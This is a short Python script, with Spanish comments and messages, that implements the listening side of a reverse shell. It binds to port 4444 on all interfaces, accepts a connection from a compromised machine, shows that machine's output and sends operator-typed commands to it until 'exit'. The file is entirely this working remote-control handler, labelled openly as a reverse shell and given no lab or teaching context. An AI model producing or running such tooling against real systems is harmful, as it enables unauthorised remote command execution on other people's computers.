import socket
import sys

def simple_reverse_shell_server():
    host = '0.0.0.0'
    port = 4444
    
    try:
        # Crear socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.listen(5)
        
        print(f"[+] Escuchando en {host}:{port}")
        print("[+] Esperando conexión...")
        
        client_socket, client_addr = s.accept()
        print(f"[+] Conexión de {client_addr}")
        print("[+] Reverse shell activa. Ctrl+C para salir\n")
        
        while True:
            try:
                # Recibir datos del cliente
                data = client_socket.recv(4096)
                if not data:
                    break
                print(data.decode('utf-8', errors='ignore'), end='')
                
                # Enviar comandos
                command = input()
                if command.lower() == 'exit':
                    break
                client_socket.send((command + '\n').encode())
                
            except KeyboardInterrupt:
                print("\n[+] Cerrando...")
                break
            except Exception as e:
                print(f"Error: {e}")
                break
                
    except Exception as e:
        print(f"Error del servidor: {e}")
    finally:
        try:
            client_socket.close()
            s.close()
        except:
            pass

if __name__ == "__main__":
    simple_reverse_shell_server()